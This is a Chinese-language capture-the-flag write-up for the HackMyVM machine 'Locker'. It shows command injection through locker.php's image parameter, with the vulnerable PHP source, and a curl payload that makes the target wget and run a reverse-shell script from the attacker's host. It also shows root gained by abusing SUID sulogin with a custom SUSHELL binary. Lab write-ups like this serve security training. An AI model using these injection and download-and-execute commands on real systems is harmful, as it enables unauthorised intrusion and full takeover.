# Locker

2024-11-08 https://hackmyvm.eu/machines/machine.php?vm=Locker

## IP

192.168.5.39

## Scan

```
PORT   STATE SERVICE
80/tcp open  http
```

只有一个开放的端口，点击首页上的 Model 链接，发现 http://192.168.5.39/locker.php?image=1 同时存在 1.jpg 的图片文件，几个图片中没有隐写信息， 可能存在 LFI 或 RCE 漏洞，经过测试，存在 RCE 漏洞，如下：

```
curl -G --data-urlencode 'image=4;id;' http://192.168.5.39/locker.php
```

可以看到 www-data 用户，所以直接 wget 执行反弹 shell：

```
curl -G --data-urlencode 'image=4;wget -q -O - http://192.168.5.3/5-3/8888.sh|bash;' http://192.168.5.39/locker.php
```

看看漏洞是怎么形成的：

```
cat locker.php

<?php
$image = $_GET['image'];
$command = "cat ".$image.".jpg | base64";
$output = shell_exec($command);
print'<img src="data:image/jpg;base64,'.$output.'"width="150"height="150"/>';
?>
```

发现 suid 程序 /usr/sbin/sulogin ，执行后提示 root locked：

```
/usr/sbin/sulogin -p
```

寻找 sulogin 的帮助文档发现：

```
sulogin looks for the environment variable SUSHELL or sushell to determine what shell to start. If the environment variable is not set, it will try to execute root’s shell from /etc/passwd. If that fails, it will fall back to /bin/sh.
```

可以设置 SUSHELL 来实现自定义的 shell 调用，新建 bash.c 文件内容为，目标机器上没有编译器，只有在 kali 上编译好后上传到目标机器(使用静态编译，目标机器上缺少库)：

```
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > bash.c && gcc bash.c --static -o bash
```

在目标机器上下载后，执行下面命令：

```
chmod +x bash
export SUSHELL=/tmp/bash
/usr/sbin/sulogin -e
```

最终得到了 user 和 root flag：

```
root@locker:/home/tolocker# cat user.txt
flaglockeryes
root@locker:/home/tolocker# cat /root/root.txt
igotroothere
```
